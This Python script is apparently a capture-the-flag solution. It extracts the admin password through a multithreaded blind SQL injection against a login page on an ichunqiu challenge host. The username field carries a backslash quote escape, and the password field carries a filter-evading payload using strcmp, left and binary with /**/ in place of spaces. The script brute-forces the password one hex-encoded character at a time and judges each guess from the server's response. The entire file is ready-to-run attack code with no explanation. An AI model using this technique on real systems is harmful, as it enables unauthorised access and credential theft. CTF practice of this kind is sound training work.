import requests
import threading

url = 'http://eci-2zebmpv3dv03drme0jtm.cloudeci1.ichunqiu.com/'

class MyThread(threading.Thread):
    def __init__(self, i, flag, lock, ran, prefix):
        super().__init__()
        self.i = i
        self.flag = flag
        self.lock = lock
        self.ran = ran
        self.prefix = prefix

    def run(self):
        for j in self.ran:
            if len(self.prefix) > self.i:
                break
            temp = self.prefix.copy()
            temp.append(hex(j).lstrip('0x'))
            # temp.insert(1, hex(j).lstrip('0x'))
            if exp(self.i, ''.join(temp)):
                if len(self.prefix) > self.i:
                    break
                self.lock.acquire()
                self.flag.append(chr(j))
                # self.flag.insert(0, chr(j))
                self.prefix.append(hex(j).lstrip('0x'))
                # self.prefix.insert(1, hex(j).lstrip('0x'))
                self.lock.release()
                print(''.join(self.flag))
                break

def exp(i, j):
    payload = r"/**/or/**/stRcmp(left(binary/**/password,{0}),{1})#".format(i, j)
    data = {
        "username": "admin\\",
        "password": payload
    }
    r = requests.post(url, data=data)
    if "flag" in r.text:
        return False
    else:
        return True

def main():
    n = 30
    flag = []
    prefix = ['0x']
    lock = threading.Lock()
    for i in range(len(prefix), n + 1):
        threads = [MyThread(i, flag, lock, range(33, 48), prefix),
                   MyThread(i, flag, lock, range(48, 65), prefix),
                   MyThread(i, flag, lock, range(65, 79), prefix),
                   MyThread(i, flag, lock, range(79, 91), prefix),
                   MyThread(i, flag, lock, range(91, 97), prefix),
                   MyThread(i, flag, lock, range(97, 111), prefix),
                   MyThread(i, flag, lock, range(111, 127), prefix)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        if len(prefix) == i:
            break
    print('output:', ''.join(flag))

if __name__ == '__main__':
    main()